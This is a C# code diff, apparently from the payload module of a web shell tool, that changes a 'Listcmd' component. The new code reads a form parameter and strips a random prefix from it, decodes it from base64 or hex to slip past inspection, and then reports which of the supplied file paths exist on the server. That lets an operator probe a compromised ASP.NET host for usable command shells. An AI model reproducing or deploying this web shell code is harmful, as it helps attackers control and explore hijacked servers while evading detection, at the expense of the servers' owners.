@@ -29,7 +29,8 @@ public class Listcmd
         String result = "";
         try
         {
-            result += this.GetInfo();
+            String binarr = decode(this.Request.Form["binarr"]);
+            result += this.ListcmdCode(binarr);
         }
         catch (Exception e)
         {
@@ -40,13 +41,16 @@ public class Listcmd
         return true;
     }
 
-    public string GetInfo()
+    public string ListcmdCode(String binarr)
     {
         String ret = "";
-        String[] c = Directory.GetLogicalDrives();
-        ret = String.Format("{0}\t", HttpContext.Current.Server.MapPath("/"));
-        for (int i = 0; i < c.Length; i++)
-            ret += c[i][0] + ":";
+        String[] ss = binarr.Split(',');
+        int i;
+        for (i = 0; i < ss.Length; i++)
+        {
+            ret += (ss[i] + "\\t" + (System.IO.File.Exists(ss[i]) ? 1 : 0) + "\\n");
+        }
+
         return ret;
     }
 
@@ -73,6 +77,47 @@ public class Listcmd
                 case "base64":
                 {
                     ret = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding(cs).GetBytes(src));
+                    break;
+                }
+                default:
+                {
+                    ret = src;
+                    break;
+                }
+            }
+        }
+        catch (Exception e)
+        {
+            ret = e.Message.ToString();
+        }
+
+        return ret;
+    }
+    public String decode(String src)
+    {
+        int prefixlen = 0;
+        try
+        {
+            prefixlen = Int32.Parse(randomPrefix);
+            src = src.Substring(prefixlen);
+        }
+        catch (Exception e)
+        {
+        }
+
+        String ret;
+        try
+        {
+            switch (encoder)
+            {
+                case "base64":
+                {
+                    ret = System.Text.Encoding.GetEncoding(cs).GetString(System.Convert.FromBase64String(src));
+                    break;
+                }
+                case "hex":
+                {
+                    ret = HexAsciiConvert(src);
                     break;
                 }
                 default:
